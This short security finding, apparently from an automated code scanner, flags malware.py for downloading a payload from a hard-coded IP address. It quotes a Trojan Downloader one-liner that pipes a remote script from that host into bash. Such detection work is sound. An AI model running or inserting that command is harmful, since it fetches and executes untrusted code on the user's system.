claims: Detected in `malware.py`. The code imports the `requests` library and makes an HTTP GET request to `http://91.92.242.30/payload`. This IP address (`91.92.242.30`) is a known malicious endpoint associated with OpenClaw attack vectors (as referenced in the provided example of a Trojan Downloader: `curl -fsSL http://91.92.242.30/malware.sh | bash`). The request downloads a payload from a suspicious external server, which is characteristic of the initial stage of a Trojan Downloader or command-and-control (C2) communication. While the code does not explicitly execute the payload in this snippet, fetching content from a known malicious source strongly indicates malicious intent and is likely part of a multi-stage attack.
